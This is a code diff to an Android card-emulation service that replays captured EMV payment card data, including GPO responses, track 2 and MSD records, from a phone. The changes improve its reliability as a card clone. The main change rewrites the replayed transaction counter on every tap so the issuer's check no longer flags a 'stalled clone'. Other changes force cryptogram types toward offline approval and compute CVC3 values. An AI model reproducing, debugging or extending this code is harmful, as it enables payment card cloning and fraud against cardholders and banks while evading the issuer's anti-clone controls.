@@ -81,8 +81,6 @@ public class ShadowApduService extends HostApduService {
 
     private static final boolean STRIP_AC = false;
 
-    private static final int[] GPO_AC_TAGS = Emv.AC_TAGS;
-
     private static final boolean EXTRA_AIDS = false;
 
     /**
@@ -217,6 +215,16 @@ public class ShadowApduService extends HostApduService {
      * stale behind a capture made in between.
      */
     private Set<String> keyCache;
+
+    /**
+     * The slot prefix for this tap, or null until first needed.
+     *
+     * CACHED, and built without going through p(). See sel().
+     *
+     * Cleared in resetTransaction() so a tap that follows a wallet swipe picks
+     * up the new slot, and so the value can never outlive the tap it belongs to.
+     */
+    private String slotPrefix;
 
     /**
      * Install the file crash logger and OPEN THE STORE HERE - but on a worker.
@@ -390,23 +398,53 @@ public class ShadowApduService extends HostApduService {
     }
 
     /**
-     * The slot prefix, with a floor.
+     * The slot prefix, cached for the tap. See slotPrefix.
      *
-     * Guarded because it sits in front of EVERY log line and of every pref key
-     * the service builds. If 'selected' is stored as an int - which is what the
-     * plaintext mirror holds, since Prefs.migrateOnce() only stringifies keys on
-     * the way into the encrypted store - a bare getString throws here and takes
-     * the whole tap with it, including the line that would have explained why.
+     * THE RECURSION THAT USED TO BE HERE. sel() built its answer with
+     * p("selected", "0"), and p() builds its key as sel() + k - so every call
+     * ran sel() -> p() -> sel() -> ... with no memoization and no re-entry
+     * flag. The only terminator was a StackOverflowError, caught by the
+     * catch (Throwable) in the innermost frame, so the whole thing collapsed to
+     * "card0_" and the real 'selected' pref was never read: p() was looking up
+     * "card0_selected", which MainActivity never writes.
      *
-     * card0_ is the honest fallback: slot 0 is what bindCard() clamps to and
-     * what every default in this class already assumes.
+     * The symptom was invisible on a one-card wallet and total beyond it: every
+     * tap served slot 0 whatever was on screen, and every ATC commit and tap log
+     * from a card 2 tap landed in card 0's slot. It also paid a full stack
+     * overflow and unwind - tens of thousands of frames - for every single pref
+     * access, dozens of times per APDU, on the binder thread.
+     *
+     * The fix is that the read below is RAW: it goes to the pref directly, not
+     * through p(), so the key it builds cannot depend on itself. The result is
+     * then cached for the tap.
+     *
+     * Guarded anyway. 'selected' may be an int from an older build or the
+     * plaintext mirror, and a bare getString throws a ClassCastException on
+     * that. card0_ is the honest fallback: slot 0 is what bindCard() clamps to
+     * and what every default in this class already assumes.
      */
     private String sel() {
+        String s = slotPrefix;
+        if (s != null) return s;
+
+        String raw = null;
         try {
-            return "card" + p("selected", "0") + "_";
-        } catch (Throwable t) {
-            return "card0_";
+            raw = prefs().getString("selected", null);
+        } catch (ClassCastException storedAsInt) {
+            try {
+                raw = String.valueOf(prefs().getInt("selected", 0));
+            } catch (Throwable ignored) {
+                raw = null;
+            }
+        } catch (Throwable ignored) {
+            raw = null;
         }
+
+        if (raw == null || raw.trim().isEmpty()) raw = "0";
+
+        s = "card" + raw.trim() + "_";
+        slotPrefix = s;
+        return s;
     }
 
     /**
@@ -427,6 +465,9 @@ public class ShadowApduService extends HostApduService {
      * it only runs on the throw, so the cost stays where it belongs. Any other
      * failure returns the default rather than propagating - a pref read is never
      * worth an APDU.
+     *
+     * sel() is safe to call here now: it is cached and does not come back
+     * through this method.
      */
     private String p(String k, String d) {
         String key = sel() + k;
@@ -527,8 +568,16 @@ public class ShadowApduService extends HostApduService {
         return raw;
     }
 
+    /**
+     * Label for the directory and the FCI, at most 16 characters.
+     *
+     * Non-printable and non-ASCII are stripped, not substituted: the label is
+     * written with US_ASCII, so an accent would otherwise land as '?' and a
+     * stray newline would land as a control byte inside a 50.
+     */
     private String labelText() {
-        String s = p("label", p("cap_label", "CARD"));
+        String s = p("label", p("cap_label", "CARD")).replaceAll("[^\\x20-\\x7E]", "").trim();
+        if (s.isEmpty()) s = "CARD";
         return s.length() > 16 ? s.substring(0, 16) : s;
     }
 
@@ -634,6 +683,9 @@ public class ShadowApduService extends HostApduService {
      * stale, and clearCallbacks drops the ones still queued. Both halves are
      * needed - the clear handles the queued runnable, the epoch handles one that
      * has already been dequeued and is mid-run on the main thread.
+     *
+     * slotPrefix goes with the rest: the next tap may be a different card, and
+     * a stale prefix would serve the previous one's slot.
      */
     private void resetTransaction() {
         try {
@@ -657,6 +709,7 @@ public class ShadowApduService extends HostApduService {
         capturedIad = null;
         gpoCid = "";
         keyCache = null;
+        slotPrefix = null;
     }
 
     private byte[] aipForMac() {
@@ -1084,6 +1137,10 @@ public class ShadowApduService extends HostApduService {
     private byte[] track2() {
         String t = p("track2", "").toUpperCase().replace('=', 'D');
         t = t.replaceAll("[^0-9A-F]", "");
+        // A leading 'B' is a start sentinel, not a nibble. The box is stored
+        // normalised, but an older slot or a hand-typed value can still carry it
+        // and hex("B411...") is one nibble out for the whole track.
+        while (t.startsWith("B")) t = t.substring(1);
 
         if (t.isEmpty()) {
             String exp = expiry6();
@@ -1146,11 +1203,21 @@ public class ShadowApduService extends HostApduService {
      *
      * A 70 wrapper is added when the skeleton arrives bare. Without it the
      * record is not a record and the parser has nothing to read.
+     *
+     * hexLenient, because a hand-typed odd-length skeleton is a typo worth
+     * padding rather than a throw: this is read several times per tap from
+     * unOffset/unLen/udolLen, all of which are on the response path.
      */
     private byte[] msdRecord() {
         String h = p("msdrec", "").replaceAll("[^0-9A-Fa-f]", "");
         if (h.isEmpty()) return null;
-        byte[] r = hex(h);
+        byte[] r;
+        try {
+            r = hex(h);
+        } catch (IllegalArgumentException oddLength) {
+            r = Hex.hexLenient(h);
+        }
+        if (r.length == 0) return null;
         if ((r[0] & 0xFF) == 0x70) return r;
         tap("-- msd: skeleton had no 70 wrapper - wrapped");
         return tlv(0x70, r);
@@ -1207,6 +1274,7 @@ public class ShadowApduService extends HostApduService {
                                 + (useScript() ? "ON" : "OFF")
                                 + " | msd=" + isMsd()
                                 + " | forcetc=" + forceOfflineTc()
+                                + " | slot=" + sel()
                                 + " | atc=" + p("atc", "001B")
                                 + " floor=" + p("atcfloor", "-"));
                         if (isMsd()) msdSanity();
@@ -1264,6 +1332,7 @@ public class ShadowApduService extends HostApduService {
                             + (cryptogramSent ? "yes cid " + gpoCid
                                               : "no, it comes in GENERATE AC"));
                     if (cryptogramSent) commitAtc();
+                    watchForStall();
                 }
                 tap("-- script hit " + out.length + " bytes");
                 tap("<< " + bytesToHex(out));
@@ -1357,6 +1426,11 @@ public class ShadowApduService extends HostApduService {
      * A forced 0x80 on a keyless card is still downgraded: computeAc would emit
      * eight zero bytes and the issuer cannot verify those.
      *
+     * The forced byte is also range-checked now. The box is free text, and
+     * "20" or "FF" used to be served as a CID a kernel cannot interpret - the
+     * response then carried 9F27 with a value nothing recognises. Anything that
+     * is not 00/40/80 falls back to the ladder.
+     *
      * This cannot live in Emv.decideCid. Its first branch is acInGpo, which
      * answers ARQC for a requested ARQC without consulting haveKey() - so once
      * an AC is in the GPO the ladder is bypassed entirely and a zero ARQC goes
@@ -1366,7 +1440,10 @@ public class ShadowApduService extends HostApduService {
         String forced = p("cid", "").replaceAll("[^0-9A-Fa-f]", "");
         if (forced.length() == 2) {
             byte c = (byte) Integer.parseInt(forced, 16);
-            return (c == CID_ARQC && !haveKey()) ? CID_TC : c;
+            if (c == CID_AAC || c == CID_TC || c == CID_ARQC) {
+                return (c == CID_ARQC && !haveKey()) ? CID_TC : c;
+            }
+            tap("-- cid box \"" + forced + "\" is not 00/40/80 - ladder decides");
         }
         if (forceOfflineTc()) return CID_TC;
         return haveKey() ? CID_ARQC : CID_TC;
@@ -1404,25 +1481,42 @@ public class ShadowApduService extends HostApduService {
                         // Format 1 is flat, carries no CID, and findTag() refuses
                         // a 0x80 by design - so forceCid() would staple a 9F27
                         // TLV into an AIP/AFL payload. A format 1 replay keeps
-                        // the captured bytes untouched.
+                        // the captured bytes untouched. Its ATC is not in the
+                        // GPO either; ccc() emits and commits that.
                         gpoCid = "";
                     } else {
                         byte rc = gpoCidFor();
                         raw = forceCid(raw, rc);
                         gpoCid = String.format("%02X", rc & 0xFF);
+
+                        // THE ATC WAS FROZEN HERE. A replayed 9F36 is the
+                        // plastic's, and returning the captured bytes verbatim
+                        // handed the issuer the same counter value on every
+                        // single tap - the window check then sees a stalled
+                        // clone. Replace it with this tap's ATC and spend it.
+                        // No 9F36 in the capture means nothing to patch, and
+                        // nothing was served, so nothing is committed either.
+                        if (findTag(raw, 0x9F36) != null) {
+                            raw = forceAtc(raw, hex(txnAtc()));
+                            commitAtc();
+                        }
                     }
 
                     txnAip = capturedAip(raw);
                     cryptogramSent = !STRIP_AC;
                     tap("-- gpo replay aip=" + bytesToHex(txnAip)
                             + " (" + (STRIP_AC ? "AC tags stripped"
-                                    : capMsd ? "format 1 - cid untouched"
-                                             : "cid forced to " + gpoCid)
+                                    : capMsd ? "format 1 - cid and atc untouched"
+                                             : "cid forced to " + gpoCid
+                                               + ", atc " + (pendingAtc == null ? "captured" : pendingAtc))
                             + ") len=" + raw.length
                             + (capturedIad == null ? "" : " iadKept=" + bytesToHex(capturedIad)));
                 } else {
                     tap("-- gpo replay verbatim len=" + raw.length);
                 }
+                // A stall after a replayed GPO is the commonest failure there
+                // is, and this path used to return without arming the watcher.
+                watchForStall();
                 return cat(raw, SW_OK);
             }
             tap("-- msd field=" + msd + " wins over captured framing=" + capMsd);
@@ -1673,6 +1767,37 @@ public class ShadowApduService extends HostApduService {
     }
 
     /**
+     * Overwrite the ATC in a replayed GPO template, in place.
+     *
+     * The counterpart of forceCid, and only ever called when findTag() has
+     * already found a 9F36 - so the append branch is a safety net for a
+     * malformed capture, not the normal path.
+     */
+    private static byte[] forceAtc(byte[] tpl, byte[] atc) {
+        int[] pos = new int[1];
+        int outer = readTag(tpl, pos);
+        int olen  = readLen(tpl, pos);
+        int end   = Math.min(tpl.length, pos[0] + olen);
+
+        int i = pos[0];
+        while (i < end) {
+            int[] q = new int[]{i};
+            int t = readTag(tpl, q);
+            int l = readLen(tpl, q);
+            if (q[0] + l > tpl.length) break;
+            if (t == 0x9F36 && l >= 2) {
+                tpl[q[0]] = atc[0];
+                tpl[q[0] + 1] = atc[1];
+                return tpl;
+            }
+            i = q[0] + l;
+        }
+
+        byte[] content = Arrays.copyOfRange(tpl, pos[0], Math.min(tpl.length, pos[0] + olen));
+        return tlv(outer, cat(content, tlv(0x9F36, atc)));
+    }
+
+    /**
      * Wrapper only. Emv holds the canonical implementation, and that is the one
      * under test - the copy that lived here still walked a format 1 payload as
      * TLV and re-encoded the AFL.
@@ -1767,9 +1892,11 @@ public class ShadowApduService extends HostApduService {
      * Visa-family MSD defines no UDOL, so the field is the UN alone and the
      * offset is 0. Only a manually typed 9F69 changes that; a Mastercard
      * skeleton can still carry one.
+     *
+     * Takes the already-parsed record so ccc() can hand the same bytes to all
+     * three helpers instead of parsing the skeleton three times.
      */
-    private int unOffset() {
-        byte[] rec = msdRecord();
+    private int unOffset(byte[] rec) {
         if (rec == null) return 0;
 
         byte[] udol = findTag(rec, TAG_UDOL);
@@ -1790,8 +1917,7 @@ public class ShadowApduService extends HostApduService {
     }
 
     /** UN length from the 9F69 descriptor, or 4 when there is none. */
-    private int unLen() {
-        byte[] rec = msdRecord();
+    private int unLen(byte[] rec) {
         if (rec == null) return 4;
         byte[] udol = findTag(rec, TAG_UDOL);
         if (udol == null) return 4;
@@ -1809,8 +1935,7 @@ public class ShadowApduService extends HostApduService {
     }
 
     /** Total data length the descriptor asks for, or 4 with no descriptor. */
-    private int udolLen() {
-        byte[] rec = msdRecord();
+    private int udolLen(byte[] rec) {
         if (rec == null) return 4;
         byte[] udol = findTag(rec, TAG_UDOL);
         if (udol == null) return 4;
@@ -1826,8 +1951,7 @@ public class ShadowApduService extends HostApduService {
         return n;
     }
 
-    private boolean hasTrack1() {
-        byte[] rec = msdRecord();
+    private boolean hasTrack1(byte[] rec) {
         return rec != null && findTag(rec, 0x56) != null;
     }
 
@@ -1847,6 +1971,9 @@ public class ShadowApduService extends HostApduService {
      * The UN width comes from the descriptor, not from a literal 4. A skeleton
      * that names a shorter UN would otherwise be sliced at the wrong width and
      * still sum to 8 - wrong input, valid length, no error anywhere.
+     *
+     * The skeleton is parsed ONCE into rec and handed to the three helpers; it
+     * used to be re-read and re-hex-parsed three times on the response path.
      */
     private byte[] ccc(byte[] apdu) {
         if (nRecs == 0) {
@@ -1860,21 +1987,23 @@ public class ShadowApduService extends HostApduService {
                 ? Arrays.copyOfRange(apdu, off, off + lc)
                 : new byte[0];
 
-        int need = udolLen();
+        byte[] rec = msdRecord();
+
+        int need = udolLen(rec);
         if (d.length != need) {
             tap("!! ccc: field is " + d.length + "B, descriptor asks " + need
                     + " - refusing, not padding");
             return SW_MALFORMED;
         }
 
-        int uo = unOffset();
-        int unLen = unLen();
-        if (uo + unLen > d.length) {
-            tap("!! ccc: 9F6A offset " + uo + " len " + unLen
+        int uo = unOffset(rec);
+        int unWidth = unLen(rec);
+        if (uo + unWidth > d.length) {
+            tap("!! ccc: 9F6A offset " + uo + " len " + unWidth
                     + " past the " + d.length + "B field");
             return SW_MALFORMED;
         }
-        byte[] un = Arrays.copyOfRange(d, uo, uo + unLen);
+        byte[] un = Arrays.copyOfRange(d, uo, uo + unWidth);
 
         String atc;
         if (atcUsedByCcc) {
@@ -1920,7 +2049,7 @@ public class ShadowApduService extends HostApduService {
                             + " cvc3=" + bytesToHex(cvc3));
 
                     byte[] ivT1 = hex(p("ivcvc3_t1", "").replaceAll("[^0-9A-Fa-f]", ""));
-                    if (hasTrack1() && ivT1.length == 2) {
+                    if (hasTrack1(rec) && ivT1.length == 2) {
                         byte[] e1 = EmvCrypto.des3(kd, Emv.cccBlock(ivT1, un, atcB));
                         cvc3T1 = Arrays.copyOfRange(e1, e1.length - 2, e1.length);
                     }
@@ -2180,10 +2309,14 @@ public class ShadowApduService extends HostApduService {
      * any of it killed the process at exactly the moment the phone is pulled
      * away, which reads to the user as "the app closed". Nothing here is worth
      * a crash: the tap has already happened.
+     *
+     * The slot prefix is read BEFORE resetTransaction(), because reset clears it
+     * and the flush below still needs to name the file the lines belong to.
      */
     @Override
     public void onDeactivated(int reason) {
         final String t = tapLog.toString();
+        final String slot = sel();
 
         String v;
         try {
@@ -2193,11 +2326,18 @@ public class ShadowApduService extends HostApduService {
         }
 
         try {
+            if (!t.isEmpty()) {
+                try {
+                    TapLog.append(this, slot, "!! verdict: " + v);
+                } catch (Throwable ignored) { }
+            }
+        } catch (Throwable ignored) { }
+
+        try {
             resetTransaction();
         } catch (Throwable ignored) { }
 
         try {
-            if (!t.isEmpty()) termLog("!! verdict: " + v);
             TapLog.flush(this);
 
             if (!t.isEmpty()) {
